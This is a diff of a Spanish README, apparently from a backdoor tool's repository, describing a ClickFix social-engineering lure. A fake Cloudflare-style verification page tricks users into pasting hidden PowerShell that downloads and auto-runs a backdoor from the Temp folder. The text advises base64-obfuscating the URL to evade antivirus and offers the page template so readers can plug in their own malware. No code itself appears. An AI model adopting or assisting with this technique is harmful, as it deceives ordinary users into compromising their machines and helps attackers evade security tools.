@@ -10,7 +10,7 @@
 
 En la siguiente captura pueden observar una página de verificación que diseñé con un estilo visual de Cloudflare:
 
-<img width="1365" height="671" alt="ClickFix-1" src="https://github.com/user-attachments/assets/cfd99dfc-fe8c-4ef0-9d0c-14d195f636f3" />
+<img width="1350" height="630" alt="ClickFix" src="https://github.com/user-attachments/assets/d14eb4ae-153d-4cbe-8add-4c7666bc12ca" />
 
 Se le pidé al usuario que copie la ruta `C:\Users\Default\verification.conf` pero al hacerlo también está copiando un código malicioso en PowerShell.
 
@@ -25,5 +25,6 @@ Si se retrocede se puede ver el código de powershell que también fue copiado, 
 <img width="686" height="43" alt="ClickFix-4" src="https://github.com/user-attachments/assets/767cdf88-10be-4138-960b-f9a2347afaf2" />
 
 Al pegarlo y darle enter, se descarga el Backdoor en la ruta `C:\Users\{Username}\AppData\Local\Temp` y se auto-ejecuta. Recomiendo ofuscar la URL en base64 para evitar detección por parte de los Antivirus. Se adjunta el <a href="https://github.com/R3LI4NT/XilentDoor/blob/main/ClickFix/index.html">index.html</a> para que puedan modificarlo y subir su propio malware.
+
 
 
